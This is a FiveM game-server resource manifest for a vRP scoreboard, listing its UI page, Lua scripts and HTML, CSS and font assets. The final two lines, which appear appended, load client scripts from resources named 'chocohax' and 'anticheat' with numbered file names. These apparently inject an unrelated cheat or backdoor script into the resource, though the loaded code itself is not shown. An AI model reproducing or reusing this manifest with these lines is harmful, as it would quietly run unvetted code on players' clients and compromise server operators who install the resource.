resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Scoreboard'

ui_page 'html/scoreboard.html'

dependency "vrp"

client_scripts{ 
	"lib/Tunnel.lua",
	"lib/Proxy.lua",
	"client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}


files {
	'html/scoreboard.html',
	'html/style.css',
	'html/reset.css',
	'html/bg.png',
	'html/newlogo.png',
	'html/listener.js',
	'html/res/futurastd-medium.css',
	'html/res/futurastd-medium.eot',
	'html/res/fontcustom.woff',
	'html/res/futurastd-medium.woff',
	'html/res/futurastd-medium.ttf',
	'html/res/opensans-light.ttf',
	'html/res/futurastd-medium.svg'
}
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'